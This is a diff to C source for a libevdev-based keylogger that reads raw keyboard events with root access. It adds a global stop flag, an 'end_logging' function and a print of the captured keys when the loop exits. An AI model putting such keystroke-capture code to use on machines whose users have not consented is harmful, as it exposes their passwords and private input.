@@ -27,6 +27,9 @@
 #include <unistd.h>
 
 
+// this is an indicator for when to stop the keylogging loop. 0 = stop
+int log_indicator = 1;
+
 // Returns hostname for the local computer
 void checkHostName(int hostname) {
   if (hostname == -1) {
@@ -88,7 +91,7 @@ void log_keys(key_package* key_package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
 
   // open a device, as libevdev expects a file descriptor. You should have root
-  // permissions
+  // permissions for this to work.
   struct libevdev* keyboard_dev;
   int rc;
 
@@ -155,7 +158,9 @@ void log_keys(key_package* key_package) {
       }
     }
 
-    if (ev.code == 107) {
+    // if (ev.code == 107) {
+    if (log_indicator == 0) {
+      print_logged_keys(*key_package);
       printf("\nexiting\n");
 
       break;
@@ -174,4 +179,9 @@ void print_logged_keys(key_package key_package) {
     printf("%s  ", key_package.keys[i].key);
   }
   printf("\n");
+}
+
+void end_logging(void) {
+  log_indicator = 0;
+  printf("Changed!\n");
 }
